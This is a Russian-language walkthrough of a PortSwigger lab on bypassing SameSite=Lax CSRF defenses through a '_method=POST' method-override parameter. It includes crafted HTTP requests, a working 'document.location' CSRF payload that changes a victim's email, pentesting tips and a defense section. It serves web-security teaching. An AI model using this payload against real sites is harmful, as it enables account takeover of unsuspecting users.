## 📘 PortSwigger Lab: SameSite Lax bypass via method override

<a id="top"></a>

> 🔗 **Лабораторная работа:** https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-using-get-requests/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override  
> 🎯 **Тема:** CSRF — обход SameSite Lax через переопределение метода (параметр `_method`)  
> 🧪 **Уровень:** Practitioner  
> ✅ **Статус:** Solved  
> 🛠 **Инструменты:** Burp Suite (Proxy, Repeater), Exploit Server, встроенный Chromium-браузер Burp  
> 🔑 **Учётные данные:** `wiener:peter`

---

## 📑 Содержание
- [📘 PortSwigger Lab: SameSite Lax bypass via method override](#-portswigger-lab-samesite-lax-bypass-via-method-override)
- [📑 Содержание](#-содержание)
- [🎯 Цель](#-цель)
- [🧠 Краткая теория](#-краткая-теория)
- [🧩 Ключевая идея](#-ключевая-идея)
- [🗺 Схема атаки](#-схема-атаки)
- [🔍 Шаг 1 — Анализ функции смены email](#-шаг-1--анализ-функции-смены-email)
- [🔍 Шаг 2 — Анализ политики SameSite](#-шаг-2--анализ-политики-samesite)
- [🔍 Шаг 3 — Обход через переопределение метода](#-шаг-3--обход-через-переопределение-метода)
- [🔍 Шаг 4 — Сборка эксплойта](#-шаг-4--сборка-эксплойта)
- [🔍 Шаг 5 — Проверка эксплойта на себе](#-шаг-5--проверка-эксплойта-на-себе)
- [🔍 Шаг 6 — Доставка эксплойта жертве](#-шаг-6--доставка-эксплойта-жертве)
- [📨 Примеры запросов](#-примеры-запросов)
- [📥 Пример результата](#-пример-результата)
- [🧾 Полная цепочка атаки](#-полная-цепочка-атаки)
- [🔬 Почему атака сработала](#-почему-атака-сработала)
- [🧠 Как думать как пентестер](#-как-думать-как-пентестер)
- [❌ Типичные ошибки](#-типичные-ошибки)
- [🛡 Защита](#-защита)
- [✅ Чек-лист](#-чек-лист)
- [🧾 Итог](#-итог)

---

<a id="goal"></a>
## 🎯 Цель
Функция смены email уязвима к CSRF. Сессионная cookie подчиняется **дефолтному SameSite=Lax** браузера (сервер явно не задаёт атрибут SameSite). Задача:

1. Использовать exploit server для размещения HTML-страницы с CSRF-атакой.
2. Изменить email жертвы через CSRF.

*Примечание: дефолтные SameSite-ограничения различаются между браузерами. Жертва использует Chrome — тестируй эксплойт в Chrome (или встроенном Chromium Burp), чтобы воспроизвести её поведение.*

*Подсказка: нельзя зарегистрировать email, уже занятый другим пользователем. Если при тестировании меняешь свой email — в финальном эксплойте используй другой адрес.*

<a id="theory"></a>
## 🧠 Краткая теория
SameSite — атрибут cookie, управляющий отправкой cookie в кросс-сайтовых запросах:

- `Strict` — cookie никогда не отправляется кросс-сайтово.
- `Lax` — cookie **отправляется** в кросс-сайтовых **GET**-запросах, являющихся **top-level навигацией** (клик по ссылке, `document.location`), но **не** в кросс-сайтовом POST (например, автосабмит формы).
- `None` — cookie отправляется всегда.

Если сервер не задаёт атрибут SameSite, современные браузеры (Chrome) применяют **дефолт Lax**. Это блокирует классический автосабмит POST-формы, но оставляет брешь: **кросс-сайтовые top-level GET-навигации по-прежнему несут сессионную cookie**.

Если сервер поддерживает переопределение метода (например, параметр `_method`), к state-changing POST-endpoint можно добраться **через GET** — GET-навигация разрешена при Lax, поэтому атакующий выполняет state-changing запрос с сессией жертвы.

<a id="idea"></a>
## 🧩 Ключевая идея
Превратить POST-запрос в **top-level GET-навигацию**:

- `POST /my-account/change-email` не содержит CSRF-токен — единственная защита это SameSite=Lax.
- Endpoint поддерживает **переопределение метода**: `?_method=POST` в query string заставляет сервер обработать GET как POST.
- GET — именно то, что Lax разрешает кросс-сайтово, если это **top-level навигация** — достигается через `document.location = ...`.

Ни токенов, ни инъекции cookie — только переопределение метода плюс GET-исключение Lax.

<a id="attack-scheme"></a>
## 🗺 Схема атаки
1. **Разведка:** Перехват `POST /my-account/change-email` — нет непредсказуемых токенов.
2. **Анализ:** Ответ `POST /login` ставит сессионную cookie **без атрибута SameSite** → дефолт Chrome — Lax.
3. **Проверка:** Change request method → GET → endpoint отклоняет не-POST.
4. **Обход:** Добавить `_method=POST` в query string → GET принят, email изменён.
5. **Эксплойт:** top-level навигация через `document.location` на скрафченный GET-URL.
6. **Проверка:** View exploit на себе → email изменён.
7. **Доставка:** Deliver to victim → лаба решена.

<a id="step1"></a>
## 🔍 Шаг 1 — Анализ функции смены email
Авторизовался под `wiener:peter` в браузере Burp и изменил email. В Proxy > HTTP history изучил запрос:

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

**Ни CSRF-токена, ни других непредсказуемых параметров** — единственная потенциальная защита это SameSite-ограничения cookie.

<a id="step2"></a>
## 🔍 Шаг 2 — Анализ политики SameSite
Посмотрел ответ на `POST /login`:

```http
Set-Cookie: session=SESSION_WIENER
```

**Атрибут `SameSite` не задан.** Chrome (браузер жертвы) применяет **дефолт Lax**:

- Кросс-сайтовый POST → сессионная cookie **не** отправляется → классический CSRF через форму не работает.
- Кросс-сайтовая **top-level GET-навигация** → сессионная cookie **отправляется** → атака остаётся возможной.

<a id="step3"></a>
## 🔍 Шаг 3 — Обход через переопределение метода
Отправил `POST /my-account/change-email` в Repeater. Правый клик → **Change request method** — Burp преобразует запрос в эквивалентный GET:

```http
GET /my-account/change-email?email=test@test.com HTTP/1.1
```

Отправил → endpoint **отклоняет** не-POST запросы.

Добавил параметр переопределения метода в query string:

```http
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER
```

**Результат:** запрос **принят** — в браузере подтвердил, что email изменился.

*Вывод: endpoint учитывает `_method=POST` из query-параметра, значит state-changing действие доступно через GET.*

<a id="step4"></a>
## 🔍 Шаг 4 — Сборка эксплойта
Пейлоад должен инициировать **top-level навигацию** (GET), чтобы Lax включил сессионную cookie. Собрал эксплойт на exploit server:

```html
<script>
    document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@web-security-academy.net&_method=POST";
</script>
```

- `document.location` выполняет top-level навигацию → подпадает под GET-исключение Lax.
- `<form>` не нужен — кросс-сайтовый POST вообще не участвует.

<a id="step5"></a>
## 🔍 Шаг 5 — Проверка эксплойта на себе
Разместил пейлоад в поле «Body» exploit-сервера, сохранил и нажал «View exploit». Убедился, что email на целевом сайте изменился. Затем сменил email в эксплойте, чтобы он не совпадал с текущим.

<a id="step6"></a>
## 🔍 Шаг 6 — Доставка эксплойта жертве
Сохранил эксплойт со свежим адресом и нажал «Deliver to victim». Email жертвы изменён → лаба решена.

<a id="requests"></a>
## 📨 Примеры запросов
**Легитимный POST (кросс-сайтово блокируется Lax)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net
```

**Прямой GET (отклоняется — неверный метод)**
```http
GET /my-account/change-email?email=attacker@web-security-academy.net HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
```

**Обход через переопределение метода (принимается)**
```http
GET /my-account/change-email?email=attacker@web-security-academy.net&_method=POST HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM
```

<a id="response"></a>
## 📥 Пример результата
**Разведка**
- Ответ `POST /login` → `Set-Cookie: session=...` **без атрибута SameSite** → дефолт Chrome — Lax.

**Тест переопределения метода**
- GET без `_method` → отказ (endpoint принимает только POST).
- GET с `_method=POST` → 302 Redirect (успех), email изменён.

**Эксплойт**
- Браузер жертвы кросс-сайтово переходит на GET-URL → сессионная cookie включена (top-level навигация при Lax) → email изменён.

<a id="attack-chain"></a>
## 🧾 Полная цепочка атаки
1. Смена email под wiener → подтверждение отсутствия CSRF-токена на `POST /my-account/change-email`.
2. Осмотр ответа `POST /login` → cookie без SameSite → дефолт Lax.
3. Repeater: Change request method → GET → отказ.
4. Добавление `_method=POST` → принят → переопределение метода подтверждено.
5. Эксплойт: `<script>document.location = "...?email=...&_method=POST";</script>`.
6. View exploit → проверка на себе → email изменён.
7. Свежий email → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Почему атака сработала
- **Дефолт Lax, а не Strict:** сервер не задаёт атрибут SameSite; Chrome подставляет Lax, который всё ещё разрешает кросс-сайтовые top-level GET-навигации.
- **Переопределение метода:** параметр `_method` позволяет вызвать POST-only обработчик через GET — ограничение метода обходится самой конструкцией.
- **Нет CSRF-токена:** без непредсказуемого токена достаточно связки «переопределение метода + GET-навигация».
- **Top-level навигация:** `document.location` удовлетворяет требованию Lax о top-level навигации, поэтому сессионная cookie прикладывается.
- **State-changing GET:** приложение нарушает семантику HTTP — state-changing операция доступна через GET.

<a id="pentester"></a>
## 🧠 Как думать как пентестер
1. **Проверяй Set-Cookie при логине:** нет атрибута SameSite → применяется дефолт браузера (обычно Lax в Chrome).
2. **Думай о том, что Lax разрешает:** кросс-сайтовые top-level GET-навигации — строй атаку вокруг GET.
3. **Ищи параметры переопределения метода:** `_method`, `_httpMethod`, Rails/Spring/Laravel-стиль превращают POST-only endpoints в доступные через GET.
4. **Тестируй state-changing GET:** если POST-endpoint вызывается через GET, SameSite Lax теряет большую часть ценности.
5. **Используй правильный браузер:** дефолты Lax различаются между браузерами — тестируй в том же движке, что у жертвы (Chrome/Chromium).

<a id="mistakes"></a>
## ❌ Типичные ошибки
- **Автосабмит POST-формы:** Lax блокирует кросс-сайтовый POST — сессионная cookie не отправится; атака должна быть GET-навигацией.
- **Забыт `_method=POST`:** обычный GET на endpoint отклоняется — без параметра переопределения запрос не дойдёт до обработчика.
- **Не top-level навигация:** запросы через `<img>`/`fetch` не являются top-level навигацией — при Lax cookie может не отправиться; `document.location` — надёжный примитив.
- **Тестирование в Firefox:** дефолтное поведение SameSite в Firefox отличается от Chrome; жертва лабы использует Chrome — используй встроенный Chromium Burp.
- **Одинаковый email в тесте и финальном эксплойте:** email уникальны; финальному эксплойту нужен другой адрес.
- **Не URL-кодирован email в Repeater:** `@` → `%40` при ручной сборке query string.

<a id="defense"></a>
## 🛡 Защита
- **Явно задавать SameSite cookie** — `Strict` (или `Lax` только для действительно безопасных GET-навигаций) для сессионных cookie; не полагаться на дефолты браузера.
- **Не поддерживать переопределение метода на security-sensitive endpoints** — или как минимум гарантировать, что CSRF-защита применяется к **эффективному** методу, а не к методу на «проводе».
- **CSRF-токены** на всех state-changing запросах независимо от метода.
- **Не реализовывать state-changing GET** — соблюдать семантику HTTP-методов.
- Проверка заголовков **Origin/Referer** для запросов, изменяющих состояние.

<a id="checklist"></a>
## ✅ Чек-лист
- [ ] Подтверждено: нет CSRF-токена на POST /my-account/change-email
- [ ] Подтверждено: сессионная cookie ставится без SameSite → дефолт Lax
- [ ] GET без переопределения → отказ; с `_method=POST` → успех
- [ ] Эксплойт использует top-level навигацию (`document.location`)
- [ ] View exploit → проверка на себе → email изменён
- [ ] Свежий, не совпадающий email в финальном эксплойте
- [ ] Deliver to victim → лаба решена
- [ ] Статус: **Solved**

<a id="conclusion"></a>
## 🧾 Итог
Лаба демонстрирует, что SameSite=Lax — не полная CSRF-защита: она блокирует кросс-сайтовый POST, но разрешает top-level GET-навигации. В сочетании с функцией переопределения метода (`_method=POST`) POST-only endpoint без токена становится полностью доступным через GET. Ключевой урок: защитные слои нужно анализировать как систему — Lax закрывает один вектор, но любой механизм, превращающий POST в GET (method override), возвращает атакующему доступ. Задавай SameSite явно, выдавай CSRF-токены и никогда не позволяй безопасности зависеть от конвенций HTTP-методов, которые само приложение умеет переопределять.

⬆ [Вернуться к началу](#top)
